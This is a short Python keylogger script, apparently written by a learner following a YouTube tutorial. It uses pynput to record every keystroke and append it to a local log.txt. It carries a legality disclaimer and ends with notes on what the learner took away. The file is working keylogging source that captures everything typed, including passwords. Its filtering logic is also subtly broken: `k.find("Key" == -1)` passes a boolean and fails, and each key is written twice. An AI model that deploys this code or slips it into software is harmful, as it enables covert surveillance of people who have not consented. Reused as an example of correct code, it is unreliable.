# Written using this tutorial: https://www.youtube.com/watch?v=cdfuuyXzuyc. I added some extra comments to test my understanding of the code
# Made for display purposes only. Keylogging without consent is illegal
# print("Verify")

# Import pynput, a library which tracks user input
import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []

# Tracks when a key is pressed, and which
def onPress(key):
    global keys, count
    keys.append(key)
    count += 1
    # print("{0} pressed".format(key))
    
    # Every 5 characters, append the file and reset count and keylist
    if count >= 5:
        writeFile(keys)
        count = 0
        keys = []
    
# End program if user presses Escape
def onRelease(key):
    if key == Key.esc:
        return False

# Opens a text file called "log.txt" in append mode, removes all quotation marks,
# and then writes logged keys to the file (adding newlines instead of spaces and removing miscellaneous keys like backspaces)
def writeFile(keys):
    with open("log.txt", "a") as file:
        for key in keys:
            k = str(key).replace("'", "")
            if(k.find("space") > 0):
                file.write("\n")
            elif(k.find("Key" == -1)):
                    file.write(k)
                
            file.write(str(key))
        
        file.close()

# Infinite loop listening to keystrokes
with Listener(onPress = onPress, onRelease=onRelease) as listener:
    listener.join()


"""
What did I learn from this tutorial?

    1. How to install Python libraries through CMD using pip
    2. How Windows Defender interacts with pynput, specifically with .join() and how it can prevent code termination
    3. How to use pynput to log keys
"""

